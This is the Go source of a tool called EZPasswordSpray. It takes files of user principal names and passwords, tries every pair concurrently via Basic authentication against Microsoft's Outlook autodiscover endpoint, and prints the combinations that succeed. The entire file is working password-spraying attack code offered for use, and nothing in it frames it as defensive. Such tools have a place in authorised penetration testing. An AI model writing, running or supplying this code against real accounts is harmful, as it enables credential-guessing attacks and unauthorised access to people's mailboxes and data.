package main

import (
	"flag"
	"fmt"
	"github.com/schollz/progressbar"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var mutex sync.Mutex
var result []string

func spray(user string, pwd string, wg *sync.WaitGroup, progressbar *progressbar.ProgressBar) {
	defer wg.Done()
	defer progressbar.Add(1)

	client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", nil)
	req.SetBasicAuth(user, pwd)
	resp, _ := client.Do(req)
	if resp == nil || resp.Status != "200 OK" {
		return
	}
	mutex.Lock()
	result = append(result, "SUCCESS: " + user + " : " + pwd)
	mutex.Unlock()
}

func readFile(path string)[]string{
	content, err := ioutil.ReadFile(path)

	if err != nil {
		flag.PrintDefaults()
		println("\nThe path \"" + path + "\" does not exist or the file format is wrong.\n")
		os.Exit(1)
	}
	tmp := string(content)
	return strings.Split(tmp, "\n")
}

func main() {
	start := time.Now()
	userList := flag.String("u","emails.txt","The users parameter is a path to the text file with the User Principal Names." +
		"\nIn each line should be one User Principal Name.")
	passwordList := flag.String("p","passwords.txt","The passwords parameter is a path to the text file with the passwords." +
		"\nIn each line should be one password.")
    verbose := flag.Bool("v", false, "Be verbose, print more details about the current procedure.")

	flag.Parse()

	users := readFile(*userList)
	pwds := readFile(*passwordList)

	fmt.Println("Starting EZPasswordSpray ( https://github.com/NSIDE-ATTACK-LOGIC/EZPasswordSpray ) at " + start.Format("2006-01-02 15:04"))
	fmt.Printf("Password Spraying on %v Users, each with %v passwords. (Reqests in total %v)\n", len(users),len(pwds), (len(pwds) * len(users)))

	var wg sync.WaitGroup
	progressBar := progressbar.New(len(pwds) * len(users))

	for _, user := range users{
		for _, pwd := range pwds{
			if len(user) > 0 && len(pwd) > 0 {
				wg.Add(1)
				if *verbose {
					mutex.Lock()
					result = append(result, "VERBOSE: Trying " + user + " : " + pwd)
					mutex.Unlock()
				}
				go spray(strings.TrimSpace(user), strings.TrimSpace(pwd), &wg, progressBar)
			}
		}
	}

	// Wait til every go routine is finished
	wg.Wait()

	fmt.Println()
	for _, res := range result {
		fmt.Println(res)
	}

	// Tracks the time that passed
	fmt.Println(fmt.Sprintf("\nFinished, elapsed time %0.2fs", time.Since(start).Seconds()))
}
